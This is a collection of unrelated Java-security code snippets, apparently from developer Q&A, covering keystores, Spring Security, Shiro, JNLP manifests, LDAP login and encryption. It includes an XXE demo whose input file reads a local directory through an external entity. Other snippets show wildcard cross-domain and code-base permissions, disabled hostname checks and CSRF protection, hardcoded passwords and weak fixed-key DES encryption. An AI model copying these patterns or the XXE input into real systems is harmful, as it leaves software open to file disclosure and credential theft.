    <!DOCTYPE cross-domain-policy SYSTEM "http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd"> 
    <cross-domain-policy>
       <allow-access-from domain="*" /> 
    </cross-domain-policy> 
---UNIQUEIDFORSNIP---|170632797|    network: Cache entry not found [url: http://xxx.xxx.xxx.xxx/crossdomain.xml, version: null]
    java.security.AccessControlException: access denied (java.net.SocketPermission xxx.xxx.xxx.xxx:80 connect,resolve)
---UNIQUEIDFORSNIP---|170660533|    <bean id="myAccessDecisionManager" class="sample.mvc.root.context.services.MyAccessDecisionManager">
        <property name="securityReferenceDataService">
            <bean  class="sample.mvc.root.context.services.SecurityReferenceDataDao"/>
        </property>
    </bean>
---UNIQUEIDFORSNIP---|170806605|    runas /noprofile /user:Administrator cmd
    cd c:\myapp
    play run
---UNIQUEIDFORSNIP---|170966391|    # our.hack = "/" on windows
    # our.hack = "" on linux
    policy.url.3=file:${our.hack}${our.home}/lib/OurSecurity.policy
---UNIQUEIDFORSNIP---|171007120|$ keytool -certreq -alias myalias -file myalias.csr -keystore keystore
---UNIQUEIDFORSNIP---|171007122|$ keytool -import -alias myalias -keystore keystore -file myalias.crt
---UNIQUEIDFORSNIP---|171007124|$ keytool -import -trustcacerts -alias intermediate -file intermediate.crt -keystore keystore
---UNIQUEIDFORSNIP---|171125439|    jnlp spec="1.0+" codebase="http://some.dn.com/OurAppHome/"  href="launch.jnlp"
---UNIQUEIDFORSNIP---|171125444|    Permissions: all-permissions
    Codebase: *
    Application-Library-Allowable-Codebase: *
---UNIQUEIDFORSNIP---|171125451|             <manifest>
                 <attribute name="Application-Name" value="Our App Name"/>
                 <attribute name="Main-Class" value="com.whatever.main.AppLoader"/>
                 <attribute name="Class-Path" value="./Corejar.jar ./Support.jar"/>
                 <attribute name="Built-By" value="${user.name}"/>
                 <attribute name="Permissions" value="all-permissions"/>
                 <attribute name="Codebase" value="*"/>
                 <attribute name="Application-Library-Allowable-Codebase" value="*"/>
                 <attribute name="Trusted-Only" value="true"/>
                 <attribute name="Specification-Title" value="Our App Name"/>
                 <attribute name="Specification-Version" value="${version}"/>
                 <attribute name="Specification-Vendor" value="Our Company Name"/>
             </manifest>
---UNIQUEIDFORSNIP---|171409693|    @Aspect
    public class SecurityAspect{
    
        @Pointcut("execution(@ForbidIf * *(*))")
        public void annotatedMethodCalled(){}
    
        @Before("annotatedMethodCalled() && @target(annotation) && target(bean)")
        public void beforeRestrictedMethodCall(
            final ForbidIf annotation, final Object bean){
            final Expression expression =
                new SpelExpressionParser().parseExpression(annotation.value());
            if(!Boolean.TRUE.equals(expression.getValue(bean))){
                throw new IllegalArgumentException();
            }
        }
    
    }
---UNIQUEIDFORSNIP---|171632190|But in my case, where user input is used only as parameter for application
---UNIQUEIDFORSNIP---|171687599|    public @interface CustomSecurityAnnotation {
    }
---UNIQUEIDFORSNIP---|171687603|	@Aspect
	@Component
	public class CustomSecurityAspect {
		@Pointcut("@annotation(my.package.CustomSecurityAnnotation)")
		private void customSecurityAnnotation() {
		}
	
		@Around("my.package.CustomSecurityAspect.customSecurityAnnotation()")
		public Object doSomething(ProceedingJoinPoint pjp) throws Throwable {
		    HttpServletRequest req = getRequest();
	        // Check header values
            // Throw Spring's AccessDeniedException if needed
			return pjp.proceed();
		}
	
		private HttpServletRequest getRequest() {
			ServletRequestAttributes sra = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
			return sra.getRequest();
		}
	}
---UNIQUEIDFORSNIP---|171760194|    <filter>
        <filter-name>HSTSFilter</filter-name>
        <filter-class>security.HSTSFilter</filter-class>
    </filter>
---UNIQUEIDFORSNIP---|171760196|    package security;
    import java.io.IOException;
    import javax.servlet.Filter;
    import javax.servlet.FilterChain;
    import javax.servlet.FilterConfig;
    import javax.servlet.ServletException;
    import javax.servlet.ServletRequest;
    import javax.servlet.ServletResponse;
    import javax.servlet.http.HttpServletResponse;
    public class HSTSFilter implements Filter {
 
        public void doFilter(ServletRequest req, ServletResponse res,
            FilterChain chain) throws IOException, ServletException {
    	    HttpServletResponse resp = (HttpServletResponse) res;
 
    	    if (req.isSecure())
    		    resp.setHeader("Strict-Transport-Security", "max-age=31622400; includeSubDomains");
    	
            chain.doFilter(req, resp);
        }
    }
---UNIQUEIDFORSNIP---|171769711|    <cxf:bus>
     <cxf:outInterceptors>
       <bean class="---------------------.WebsphereSslOutInterceptor" />
    </cxf:outInterceptors>
    </cxf:bus>
---UNIQUEIDFORSNIP---|171780763|    private String getUserName() {
        AccessControlContext acc = AccessController.getContext();
        Subject subject = Subject.getSubject(acc);
        if (subject != null)  {
        Set<JMXPrincipal> principals = subject.getPrincipals(JMXPrincipal.class);
        JMXPrincipal principal = principals.iterator().next();
        return principal.getName();
        }
        return "";
    }
---UNIQUEIDFORSNIP---|171908238|    [main]
    passwordService = org.apache.shiro.authc.credential.DefaultPasswordService
    passwordService.hashService.hashAlgorithmName = SHA-512
    passwordService.hashService.hashIterations = 500000
    # use the passwordService for credentials matching for a Realm:
    passwordMatcher = org.apache.shiro.authc.credential.PasswordMatcher
    passwordMatcher.passwordService = $passwordService
    
    myRelam = ....
    myRealm.credentialsMatcher = $passwordMatcher
---UNIQUEIDFORSNIP---|171908245|    <bean id="passwordService" class="org.apache.shiro.authc.credential.DefaultPasswordService">
      <property name="hashService.hashAlgorithmName" value="SHA-512"/>
      <property name="hashService.hashIterations" value="500000"/>
    </bean>
    
    <bean id="myRealm" class="...">
      <property name="credentialsMatcher">
        <bean class="org.apache.shiro.authc.credential.PasswordMatcher">
          <property name="passwordService" ref="passwordService"/>
        </bean>
      </property>
    </bean>
---UNIQUEIDFORSNIP---|171908247|    String encryptedPassword = passwordService.encryptPassword(signupForm.getPassword());
    userService.createUser(signupForm.getFullName(), signupForm.getEmail(), encryptedPassword);
---UNIQUEIDFORSNIP---|172077873|    ClassLoader cl = HCTest.class.getClassLoader();
    URL url = cl.getResource("test.keystore");
    KeyStore keystore  = KeyStore.getInstance("jks");
    char[] pwd = "nopassword".toCharArray();
    keystore.load(url.openStream(), pwd);
    
    TrustManagerFactory tmf = TrustManagerFactory.getInstance(
            TrustManagerFactory.getDefaultAlgorithm());
    tmf.init(keystore);
    TrustManager[] tm = tmf.getTrustManagers();
    
    KeyManagerFactory kmfactory = KeyManagerFactory.getInstance(
            KeyManagerFactory.getDefaultAlgorithm());
    kmfactory.init(keystore, pwd);
    KeyManager[] km = kmfactory.getKeyManagers();
    
    SSLContext sslcontext = SSLContext.getInstance("TLS");
    sslcontext.init(km, tm, null);
    
    LocalTestServer localServer = new LocalTestServer(sslcontext);
    localServer.registerDefaultHandlers();
    
    localServer.start();
    try {
    
        DefaultHttpClient httpclient = new DefaultHttpClient();
        TrustStrategy trustStrategy = new TrustStrategy() {
    
            public boolean isTrusted(X509Certificate[] chain, String authType) throws CertificateException {
                for (X509Certificate cert: chain) {
                    System.err.println(cert);
                }
                return false;
            }
    
        };
    
        SSLSocketFactory sslsf = new SSLSocketFactory("TLS", null, null, keystore, null,
                trustStrategy, new AllowAllHostnameVerifier());
        Scheme https = new Scheme("https", 443, sslsf);
        httpclient.getConnectionManager().getSchemeRegistry().register(https);
    
        InetSocketAddress address = localServer.getServiceAddress();
        HttpHost target1 = new HttpHost(address.getHostName(), address.getPort(), "https");
        HttpGet httpget1 = new HttpGet("/random/100");
        HttpResponse response1 = httpclient.execute(target1, httpget1);
        System.err.println(response1.getStatusLine());
        HttpEntity entity1 = response1.getEntity();
        EntityUtils.consume(entity1);
        HttpHost target2 = new HttpHost("www.verisign.com", 443, "https");
        HttpGet httpget2 = new HttpGet("/");
        HttpResponse response2 = httpclient.execute(target2, httpget2);
        System.err.println(response2.getStatusLine());
        HttpEntity entity2 = response2.getEntity();
        EntityUtils.consume(entity2);
    } finally {
        localServer.stop();
    }
---UNIQUEIDFORSNIP---|172077875|    [
    [
      Version: V1
      Subject: CN=Simple Test Http Server, OU=Jakarta HttpClient Project, O=Apache Software Foundation, L=Unknown, ST=Unknown, C=Unknown
      Signature Algorithm: SHA1withDSA, OID = 1.2.840.10040.4.3
    
      Key:  Sun DSA Public Key
        Parameters:DSA
    	p:     fd7f5381 1d751229 52df4a9c 2eece4e7 f611b752 3cef4400 c31e3f80 b6512669
        455d4022 51fb593d 8d58fabf c5f5ba30 f6cb9b55 6cd7813b 801d346f f26660b7
        6b9950a5 a49f9fe8 047b1022 c24fbba9 d7feb7c6 1bf83b57 e7c6a8a6 150f04fb
        83f6d3c5 1ec30235 54135a16 9132f675 f3ae2b61 d72aeff2 2203199d d14801c7
    	q:     9760508f 15230bcc b292b982 a2eb840b f0581cf5
    	g:     f7e1a085 d69b3dde cbbcab5c 36b857b9 7994afbb fa3aea82 f9574c0b 3d078267
        5159578e bad4594f e6710710 8180b449 167123e8 4c281613 b7cf0932 8cc8a6e1
        3c167a8b 547c8d28 e0a3ae1e 2bb3a675 916ea37f 0bfa2135 62f1fb62 7a01243b
        cca4f1be a8519089 a883dfe1 5ae59f06 928b665e 807b5525 64014c3b fecf492a
    
      y:
        f0cc639f 702fd3b1 03fa8fa6 676c3756 ea505448 23cd1147 fdfa2d7f 662f7c59
        a02ddc1a fd76673e 25210344 cebbc0e7 6250fff1 a814a59f 30ff5c7e c4f186d8
        f0fd346c 29ea270d b054c040 c74a9fc0 55a7020f eacf9f66 a0d86d04 4f4d23de
        7f1d681f 45c4c674 5762b71b 808ded17 05b74baf 8de3c4ab 2ef662e3 053af09e
    
      Validity: [From: Sat Dec 11 14:48:35 CET 2004,
                   To: Tue Dec 09 14:48:35 CET 2014]
      Issuer: CN=Simple Test Http Server, OU=Jakarta HttpClient Project, O=Apache Software Foundation, L=Unknown, ST=Unknown, C=Unknown
      SerialNumber: [    41bafab3]
    
    ]
      Algorithm: [SHA1withDSA]
      Signature:
    0000: 30 2D 02 15 00 85 BE 6B   D0 91 EF 34 72 05 FF 1A  0-.....k...4r...
    0010: DB F6 DE BF 92 53 9B 14   27 02 14 37 8D E8 CB AC  .....S..'..7....
    0020: 4E 6C 93 F2 1F 7D 20 A1   2D 6F 80 5F 58 AE 33     Nl.... .-o._X.3
    
    ]
    HTTP/1.1 200 OK
    [
    [
      Version: V3
      Subject: CN=www.verisign.com, OU=" Production Security Services", O="VeriSign, Inc.", STREET=487 East Middlefield Road, L=Mountain View, ST=California, OID.2.5.4.17=94043, C=US, SERIALNUMBER=2497886, OID.2.5.4.15="V1.0, Clause 5.(b)", OID.1.3.6.1.4.1.311.60.2.1.2=Delaware, OID.1.3.6.1.4.1.311.60.2.1.3=US
      Signature Algorithm: SHA1withRSA, OID = 1.2.840.113549.1.1.5
    
      Key:  Sun RSA public key, 2048 bits
      modulus: 20699622354183393041832954221256409980425015218949582822286196083815087464214375375678538878841956356687753084333860738385445545061253653910861690581771234068858443439641948884498053425403458465980515883570440998475638309355278206558031134532548167239684215445939526428677429035048018486881592078320341210422026566944903775926801017506416629554190534665876551381066249522794321313235316733139718653035476771717662585319643139144923795822646805045585537550376512087897918635167815735560529881178122744633480557211052246428978388768010050150525266771462988042507883304193993556759733514505590387262811565107773578140271
      public exponent: 65537
      Validity: [From: Wed May 26 02:00:00 CEST 2010,
                   To: Sat May 26 01:59:59 CEST 2012]
      Issuer: CN=VeriSign Class 3 Extended Validation SSL SGC CA, OU=Terms of use at https://www.verisign.com/rpa (c)06, OU=VeriSign Trust Network, O="VeriSign, Inc.", C=US
      SerialNumber: [    53d2bef9 24a7245e 83ca01e4 6caa2477]
    
    Certificate Extensions: 10
    [1]: ObjectId: 1.3.6.1.5.5.7.1.1 Criticality=false
    AuthorityInfoAccess [
      [accessMethod: 1.3.6.1.5.5.7.48.1
       accessLocation: URIName: http://EVIntl-ocsp.verisign.com, accessMethod: 1.3.6.1.5.5.7.48.2
       accessLocation: URIName: http://EVIntl-aia.verisign.com/EVIntl2006.cer]
    ]
    
    ...
    
    ]
    Exception in thread "main" javax.net.ssl.SSLPeerUnverifiedException: peer not authenticated
    	at com.sun.net.ssl.internal.ssl.SSLSessionImpl.getPeerCertificates(SSLSessionImpl.java:345)
    	at org.apache.http.conn.ssl.AbstractVerifier.verify(AbstractVerifier.java:128)
    	at org.apache.http.conn.ssl.SSLSocketFactory.createLayeredSocket(SSLSocketFactory.java:446)
    ...
---UNIQUEIDFORSNIP---|172079166|    HashLoginService loginService = new HashLoginService("MyRealm");
    		
    UserStore userStore = new UserStore();
    userStore.addUser(userName, new Password("password"), new String[] { "users"});
    
    loginService.setUserStore(userStore);
---UNIQUEIDFORSNIP---|172113504|        @EnableWebSocket
        @Configuration
        public class WebSocketConfig implements WebSocketConfigurer {
        @Override
        public void registerWebSocketHandlers(WebSocketHandlerRegistry 
           webSocketHandlerRegistry) {
        webSocketHandlerRegistry.addHandler(createHandler(), 
        "/handler").addInterceptors(new HttpSessionHandshakeInterceptor() 
          {
            @Override
            public void afterHandshake(ServerHttpRequest request, 
             ServerHttpResponse response, WebSocketHandler wsHandler, 
             @Nullable Exception ex) {
                super.afterHandshake(request, response, wsHandler, ex);
            }
            @Override
            public boolean beforeHandshake(ServerHttpRequest request, 
             ServerHttpResponse response, WebSocketHandler wsHandler, 
              Map<String, Object> attributes) throws Exception {
                boolean b = super.beforeHandshake(request, response, 
             wsHandler, attributes) && 
          ((UsernamePasswordAuthenticationToken) 
        request.getPrincipal()).isAuthenticated();
                return b;
            }
             }).withSockJS();
        }
         @Bean
         public WebSocketHandler createHandler() {
        return new MyHandler();
        }
       }
---UNIQUEIDFORSNIP---|172125459|    @Configuration
    @EnableWebSecurity
    @Order(1)
    public class StatefulConfig extends WebSecurityConfigurerAdapter {
    
        @Override
        protected void configure(AuthenticationManagerBuilder auth) throws Exception {
            auth.authenticationProvider(authProvider).authenticationProvider(secondaryAuthProvider) ;
        }
    
    
        @Override
        protected void configure(HttpSecurity http) throws Exception {
            
            http.csrf().disable().sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED).and()
           .antMatcher("/web/*").authorizeRequests()
                    .antMatchers("/*").hasAnyRole("ADMIN","VISITOR").and().
                    formLogin().defaultSuccessUrl("/web/login").failureUrl("/web/error").loginPage("/web/login").usernameParameter("username").passwordParameter("password").failureUrl("/").
                    and().logout().logoutUrl("/web/logout").permitAll().and().exceptionHandling().accessDeniedPage("/403").and()
                    .authorizeRequests().antMatchers("/resources/**").permitAll();
        }
    
    }
---UNIQUEIDFORSNIP---|172125461|    @Configuration
    @Order(2)
    public class StatelessConfig extends WebSecurityConfigurerAdapter {
    
        @Override
        protected void configure(AuthenticationManagerBuilder auth) throws Exception {
            auth.authenticationProvider(authProvider).authenticationProvider(secondaryAuthProvider) ;
        }
    
    
        @Override
        protected void configure(HttpSecurity http) throws Exception {
    
            http.csrf().disable().sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS).and()
               .antMatcher("/api/*").authorizeRequests()
                    .antMatchers("/api/**").authenticated().and().httpBasic().realmName("MY_TEST_REALM").
      authenticationEntryPoint(getBasicAuthEntryPoint());
    }
        @Bean
        public CustomBasicAuthenticationEntryPoint getBasicAuthEntryPoint(){
            return new CustomBasicAuthenticationEntryPoint();
        }
    
    }
---UNIQUEIDFORSNIP---|172284350|            /**
       54    * This is a class that checks the revocation status of a certificate(s) using
       55    * OCSP. It is not a PKIXCertPathChecker and therefore can be used outside of
       56    * the CertPathValidator framework. It is useful when you want to
       57    * just check the revocation status of a certificate, and you don't want to
       58    * incur the overhead of validating all of the certificates in the
       59    * associated certificate chain.
       60    *
       61    * @author Sean Mullan
       62    */
---UNIQUEIDFORSNIP---|172396639|    package xxe;
    
    import javax.xml.bind.*;
    import javax.xml.stream.*;
    import javax.xml.transform.stream.StreamSource;
    
    public class Demo {
    
    	public static void main(String[] args) throws Exception {
    		JAXBContext jc = JAXBContext.newInstance(Customer.class);
    		
    		XMLInputFactory xif = XMLInputFactory.newFactory();
    		xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
    		xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
    		XMLStreamReader xsr = xif.createXMLStreamReader(new StreamSource("src/xxe/input.xml"));
    		
    		Unmarshaller unmarshaller = jc.createUnmarshaller();
    		Customer customer = (Customer) unmarshaller.unmarshal(xsr);
    		
    		Marshaller marshaller = jc.createMarshaller();
    		marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
    		marshaller.marshal(customer, System.out);
    	}
    
    }
---UNIQUEIDFORSNIP---|172396643|    <?xml version="1.0"?>
    <!DOCTYPE customer
    [
    <!ENTITY name SYSTEM "/Users/bdoughan/Examples/src/xxe/">
    ]
    >
    <customer>
      <name>&name;</name>
    </customer>
---UNIQUEIDFORSNIP---|172396646|    package xxe;
    
    import javax.xml.bind.annotation.XmlRootElement;
    
    @XmlRootElement
    public class Customer {
    
    	private String name;
    
    	public String getName() {
    		return name;
    	}
    
    	public void setName(String name) {
    		this.name = name;
    	}
    	
    }
---UNIQUEIDFORSNIP---|172396650|    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <customer>
        <name>Customer.java
    Demo.java
    input.xml
    </name>
    </customer>
---UNIQUEIDFORSNIP---|172396652|    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <customer>
        <name></name>
    </customer>
---UNIQUEIDFORSNIP---|172396654|    Exception in thread "main" javax.xml.bind.UnmarshalException
     - with linked exception:
    [javax.xml.stream.XMLStreamException: ParseError at [row,col]:[8,15]
    Message: The entity "name" was referenced, but not declared.]
    	at com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.handleStreamException(UnmarshallerImpl.java:436)
    	at com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:372)
    	at com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal(UnmarshallerImpl.java:342)
    	at xxe.Demo.main(Demo.java:18)
    Caused by: javax.xml.stream.XMLStreamException: ParseError at [row,col]:[8,15]
    Message: The entity "name" was referenced, but not declared.
    	at com.sun.org.apache.xerces.internal.impl.XMLStreamReaderImpl.next(XMLStreamReaderImpl.java:598)
    	at com.sun.xml.bind.v2.runtime.unmarshaller.StAXStreamConnector.bridge(StAXStreamConnector.java:196)
    	at com.sun.xml.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:370)
    	... 2 more
---UNIQUEIDFORSNIP---|172418130|KeyStore.getInstance("PKCS12","BC")
---UNIQUEIDFORSNIP---|172426495|    	//These will be used as the source of the configuration file's stored attributes.
    	private static final Map<String, String> COMMON_ATTRIBUTES = new HashMap<String, String>();
    	private static final Map<String, char[]> SECURE_ATTRIBUTES = new HashMap<String, char[]>();
    	//Ciphering (encryption and decryption) password/key.
    	private static final char[] PASSWORD = "Unauthorized_Personel_Is_Unauthorized".toCharArray();
    	//Cipher salt.
    	private static final byte[] SALT = {
    		(byte) 0xde, (byte) 0x33, (byte) 0x10, (byte) 0x12,
    		(byte) 0xde, (byte) 0x33, (byte) 0x10, (byte) 0x12,};
    	//Desktop dir:
    	private static final File DESKTOP = new File(System.getProperty("user.home") + "/Desktop");
    	//File names:
    	private static final String NO_ENCRYPTION = "no_layers.txt";
    	private static final String SINGLE_LAYER = "single_layer.txt";
    	private static final String DOUBLE_LAYER = "double_layer.txt";
    
    	/**
    	 * @param args the command line arguments
    	 */
    	public static void main(String[] args) throws GeneralSecurityException, FileNotFoundException, IOException {
    		//Set common attributes.
    		COMMON_ATTRIBUTES.put("Gender", "Male");
    		COMMON_ATTRIBUTES.put("Age", "21");
    		COMMON_ATTRIBUTES.put("Name", "Hypot Hetical");
    		COMMON_ATTRIBUTES.put("Nickname", "HH");
    
    		/*
    		 * Set secure attributes.
    		 * NOTE: Ignore the use of Strings here, it's being used for convenience only.
    		 * In real implementations, JPasswordField.getPassword() would send the arrays directly.
    		 */
    		SECURE_ATTRIBUTES.put("Username", "Hypothetical".toCharArray());
    		SECURE_ATTRIBUTES.put("Password", "LetMePass_Word".toCharArray());
    
    		/*
    		 * For demosntration purposes, I make the three encryption layer-levels I mention.
    		 * To leave no doubt the code works, I use real file IO.
    		 */
    		//File without encryption.
    		create_EncryptedFile(NO_ENCRYPTION, COMMON_ATTRIBUTES, SECURE_ATTRIBUTES, 0);
    		//File with encryption to secure attributes only.
    		create_EncryptedFile(SINGLE_LAYER, COMMON_ATTRIBUTES, SECURE_ATTRIBUTES, 1);
    		//File completely encrypted, including re-encryption of secure attributes.
    		create_EncryptedFile(DOUBLE_LAYER, COMMON_ATTRIBUTES, SECURE_ATTRIBUTES, 2);
    
    		/*
    		 * Show contents of all three encryption levels, from file.
    		 */
    		System.out.println("NO ENCRYPTION: \n" + readFile_NoDecryption(NO_ENCRYPTION) + "\n\n\n");
    		System.out.println("SINGLE LAYER ENCRYPTION: \n" + readFile_NoDecryption(SINGLE_LAYER) + "\n\n\n");
    		System.out.println("DOUBLE LAYER ENCRYPTION: \n" + readFile_NoDecryption(DOUBLE_LAYER) + "\n\n\n");
    
    		/*
    		 * Decryption is demonstrated with the Double-Layer encryption file.
    		 */
    		//Descrypt first layer. (file content) (REMEMBER: Layers are in reverse order from writing).
    		String decryptedContent = readFile_ApplyDecryption(DOUBLE_LAYER);
    		System.out.println("READ: [first layer decrypted]\n" + decryptedContent + "\n\n\n");
    		//Decrypt second layer (secure data).
    		for (String line : decryptedContent.split("\n")) {
    			String[] pair = line.split(": ", 2);
    			if (pair[0].equalsIgnoreCase("Username") || pair[0].equalsIgnoreCase("Password")) {
    				System.out.println("Decrypted: " + pair[0] + ": " + decrypt(pair[1]));
    			}
    		}
    	}
    
    	private static String encrypt(byte[] property) throws GeneralSecurityException {
    		SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
    		SecretKey key = keyFactory.generateSecret(new PBEKeySpec(PASSWORD));
    		Cipher pbeCipher = Cipher.getInstance("PBEWithMD5AndDES");
    		pbeCipher.init(Cipher.ENCRYPT_MODE, key, new PBEParameterSpec(SALT, 20));
    
    		//Encrypt and save to temporary storage.
    		String encrypted = Base64.encodeBytes(pbeCipher.doFinal(property));
    
    		//Cleanup data-sources - Leave no traces behind.
    		for (int i = 0; i < property.length; i++) {
    			property[i] = 0;
    		}
    		property = null;
    		System.gc();
    
    		//Return encryption result.
    		return encrypted;
    	}
    
    	private static String encrypt(char[] property) throws GeneralSecurityException {
    		//Prepare and encrypt.
    		byte[] bytes = new byte[property.length];
    		for (int i = 0; i < property.length; i++) {
    			bytes[i] = (byte) property[i];
    		}
    		String encrypted = encrypt(bytes);
    
    		/*
    		 * Cleanup property here. (child data-source 'bytes' is cleaned inside 'encrypt(byte[])').
    		 * It's not being done because the sources are being used multiple times for the different layer samples.
    		 */
    //		for (int i = 0; i < property.length; i++) { //cleanup allocated data.
    //			property[i] = 0;
    //		}
    //		property = null; //de-allocate data (set for GC).
    //		System.gc(); //Attempt triggering garbage-collection.
    
    		return encrypted;
    	}
    
    	private static String encrypt(String property) throws GeneralSecurityException {
    		String encrypted = encrypt(property.getBytes());
    		/*
    		 * Strings can't really have their allocated data cleaned before CG,
    		 * that's why secure data should be handled with char[] or byte[].
    		 * Still, don't forget to set for GC, even for data of sesser importancy;
    		 * You are making everything safer still, and freeing up memory as bonus.
    		 */
    		property = null;
    		return encrypted;
    	}
    
    	private static String decrypt(String property) throws GeneralSecurityException, IOException {
    		SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
    		SecretKey key = keyFactory.generateSecret(new PBEKeySpec(PASSWORD));
    		Cipher pbeCipher = Cipher.getInstance("PBEWithMD5AndDES");
    		pbeCipher.init(Cipher.DECRYPT_MODE, key, new PBEParameterSpec(SALT, 20));
    		return new String(pbeCipher.doFinal(Base64.decode(property)));
    	}
    
    	private static void create_EncryptedFile(
    					String fileName,
    					Map<String, String> commonAttributes,
    					Map<String, char[]> secureAttributes,
    					int layers)
    					throws GeneralSecurityException, FileNotFoundException, IOException {
    		StringBuilder sb = new StringBuilder();
    		for (String k : commonAttributes.keySet()) {
    			sb.append(k).append(": ").append(commonAttributes.get(k)).append(System.lineSeparator());
    		}
    		//First encryption layer. Encrypts secure attribute values only.
    		for (String k : secureAttributes.keySet()) {
    			String encryptedValue;
    			if (layers >= 1) {
    				encryptedValue = encrypt(secureAttributes.get(k));
    			} else {
    				encryptedValue = new String(secureAttributes.get(k));
    			}
    			sb.append(k).append(": ").append(encryptedValue).append(System.lineSeparator());
    		}
    
    		//Prepare file and file-writing process.
    		File f = new File(DESKTOP, fileName);
    		if (!f.getParentFile().exists()) {
    			f.getParentFile().mkdirs();
    		} else if (f.exists()) {
    			f.delete();
    		}
    		BufferedWriter bw = new BufferedWriter(new FileWriter(f));
    		//Second encryption layer. Encrypts whole file content including previously encrypted stuff.
    		if (layers >= 2) {
    			bw.append(encrypt(sb.toString().trim()));
    		} else {
    			bw.append(sb.toString().trim());
    		}
    		bw.flush();
    		bw.close();
    	}
    
    	private static String readFile_NoDecryption(String fileName) throws FileNotFoundException, IOException, GeneralSecurityException {
    		File f = new File(DESKTOP, fileName);
    		BufferedReader br = new BufferedReader(new FileReader(f));
    		StringBuilder sb = new StringBuilder();
    		while (br.ready()) {
    			sb.append(br.readLine()).append(System.lineSeparator());
    		}
    		return sb.toString();
    	}
    
    	private static String readFile_ApplyDecryption(String fileName) throws FileNotFoundException, IOException, GeneralSecurityException {
    		File f = new File(DESKTOP, fileName);
    		BufferedReader br = new BufferedReader(new FileReader(f));
    		StringBuilder sb = new StringBuilder();
    		while (br.ready()) {
    			sb.append(br.readLine()).append(System.lineSeparator());
    		}
    		return decrypt(sb.toString());
    	}
---UNIQUEIDFORSNIP---|172436211|    Manifest-Version: 1.0
        Created-By: 1.7.0_51
        Permissions: all-permissions
        Application-Name: My Farming Business
        Application-Library-Allowable-Codebase: www.mycompany.com/where_the_applet_jar_actually_lives
        Caller-Allowable-Codebase:www.mycompany.com
        Codebase: *
---UNIQUEIDFORSNIP---|172558422|	<security-role>
		<role-name>*</role-name>
	</security-role>
	<security-constraint>
		<web-resource-collection>
			<web-resource-name>Protected Resources</web-resource-name>
			<url-pattern>/*</url-pattern>
		</web-resource-collection>
		<auth-constraint>
			<role-name>*</role-name>
		</auth-constraint>
		<user-data-constraint>
			<transport-guarantee>NONE</transport-guarantee>
		</user-data-constraint>
	</security-constraint>
	<login-config>
		<auth-method>FORM</auth-method>
		<realm-name>ldap</realm-name>
		<form-login-config>
			<form-login-page>/login.html</form-login-page>
			<form-error-page>/login.html</form-error-page>
		</form-login-config>
	</login-config>
---UNIQUEIDFORSNIP---|172558425|    <login-module code="org.jboss.security.auth.spi.LdapExtLoginModule" flag="required">
        <module-option name="java.naming.provider.url" value="ldap://localhost:389"/>
        <module-option name="java.naming.security.authentication" value="simple"/>
        <module-option name="bindDN" value="cn=Manager,dc=domain,dc=com"/>
        <module-option name="baseCtxDN" value="ou=people,dc=domain,dc=com"/>
        <module-option name="baseFilter" value="(cn={0})"/>
        <module-option name="bindCredential" value="password"/>
        <module-option name="principalDNPrefix" value="cn="/>
        <module-option name="principalDNSuffix" value=",ou=people,dc=domain,dc=com"/>
        <module-option name="rolesCtxDN" value="ou=groups,dc=domain,dc=com"/>
        <module-option name="uidAttributeID" value="uid"/>
        <module-option name="matchOnUserDN" value="true"/>
        <module-option name="roleAttributeID" value="cn"/>
        <module-option name="roleAttributeIsDN" value="false"/>
        <module-option name="roleRecursion" value="-1"/>
        <module-option name="roleFilter" value="(member={1})"/>
        <module-option name="allowEmptyPasswords" value="false"/>
        <module-option name="Context.REFERRAL" value="follow"/>
        <module-option name="throwValidateError" value="true"/>
    </login-module>
---UNIQUEIDFORSNIP---|172858322|    #!/usr/bin/ruby -w
    START_A = "A"[0]
    START_a = "a"[0]
    START_0 = "0"[0]
    CODEMASK = ((1 << 28) - 1) # turn on lower 28 bits
    RANDOMMASK = ((1 << 60) - 1) & ~ CODEMASK # turn on upper 32 bits
    def compress(line)
        a, b, c, h, i, j, k = line.chomp().each_char().entries()
        a, b, c = a[0], b[0], c[0]
        small_a, small_b, small_c = a - START_A, b - START_A, c - START_A
        letters = (small_a * 26**2) + (small_b * 26) + small_c
        h, i, j, k = Integer(h), Integer(i), Integer(j), Integer(k)
        number = letters * 10_000 + h*1000 + i*100 + j*10 + k
    end
    def uncompress(number)
        k = number % 10
        number /= 10
        j = number % 10
        number /= 10
        i = number % 10
        number /= 10
        h = number % 10
        number /= 10
        small_c = number % 26
        number /= 26
        small_b = number % 26
        number /= 26
        small_a = number % 26
        number /= 26
        if (number != 0)
                raise "input wasn't generated with compress()"
        end
        a, b, c = small_a + START_A, small_b + START_A, small_c + START_A
        [a.chr(), b.chr(), c.chr(), h.to_s(), i.to_s(), j.to_s(), k.to_s()].join()
    end
    def add_random(number)
        (rand(2**31) << 28) + number
    end 
    def remove_random(number)
        [number & CODEMASK, number & RANDOMMASK]
    end
    def to_output(number)
        a = []
        begin
                a << transform_out(number % 62)
                number /= 62
        end while(number > 0)
        a.reverse().join()
    end
    def from_output(string)
        num = 0
        string.each_char() do |c|
                num *= 62
                num += transform_in(c)
        end     
        num
    end
    def transform_out(small)
        if (small < 0 || small > 61)
                raise "small should be between 0 and 61, inclusive"
        end
        if (small < 26)
                out = START_A+small
        elsif (small < 52)
                out = START_a+(small-26)
        else
                out = START_0+(small-52)
        end
        out.chr()
    end
    def transform_in(char)
        if (/^[A-Za-z0-9]$/ !~ char)
                raise "char should be A-Z, a-z, or 0-9, inclusive"
        end
        num = char[0]
        out = case num
        when START_A .. START_A+26 then num - START_A
        when START_a .. START_a+26 then (num - START_a) + 26
